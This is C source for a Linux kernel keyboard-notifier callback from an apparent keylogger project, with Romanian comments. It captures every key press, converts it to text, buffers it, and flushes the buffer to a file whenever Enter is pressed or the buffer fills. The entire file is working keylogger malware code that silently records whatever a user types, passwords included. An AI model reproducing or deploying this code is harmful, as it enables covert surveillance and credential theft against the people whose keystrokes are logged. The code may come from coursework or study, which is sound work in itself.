#include "keyboard_callback.h"
#include "struct_keylogger.h"
#include "keycode_to_string.h"
#include "flush.h"
 int keyboard_callback(struct notifier_block* nb,unsigned long action, void *data)
{
    struct keyboard_notifier_param* kparam;
    struct KEYLOGGER* klogger;
    kparam=(struct keyboard_notifier_param*)data;
    klogger=container_of(nb,KEYLOGGER,key_notifier);
    if(kparam->down==0)
        return NOTIFY_OK;
    char tmp[TMP_BUFF_SIZE];//bufferul in care voi avea tasta apasata
    size_t keystrlen=0;//lungimea tastei
    if((keystrlen=keycode_to_string(kparam->value,kparam->shift,tmp,TMP_BUFF_SIZE))==0)
        return NOTIFY_OK;
    if(tmp[0]=='\n')//daca a apasat enter scriem in fisier
    {
        klogger->keyboard_read_buffer[klogger->keyboard_read_buffer_offset++]='\n';
        flush(klogger);
        return NOTIFY_OK;

    }
    if((klogger->keyboard_read_buffer_offset+keystrlen)>BUFF_SIZE-2)//daca depaseste lungimea scriem mai intai golim si apoi punem
    {
        flush(klogger);
    }
    strncpy(klogger->keyboard_read_buffer+klogger->keyboard_read_buffer_offset,tmp,keystrlen);//scriem
    klogger->keyboard_read_buffer_offset+=keystrlen;
    return NOTIFY_OK;
}
